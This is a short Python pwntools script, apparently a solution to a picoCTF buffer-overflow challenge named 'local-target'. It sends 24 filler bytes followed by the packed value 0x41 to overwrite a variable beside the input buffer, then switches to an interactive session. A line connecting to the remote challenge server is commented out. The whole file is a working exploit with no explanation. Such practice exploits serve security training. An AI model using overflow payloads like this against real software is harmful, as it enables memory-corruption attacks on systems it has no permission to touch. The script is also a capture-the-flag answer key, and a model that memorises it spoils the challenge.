#!/usr/bin/env python3
from pwn import *
#io = remote('saturn.picoctf.net', 59384)
io = process('./local-target')

payload = b'A' * 24
payload += p64(0x0000000000000041)
io.recvuntil(b':')
io.sendline(payload)

io.interactive()
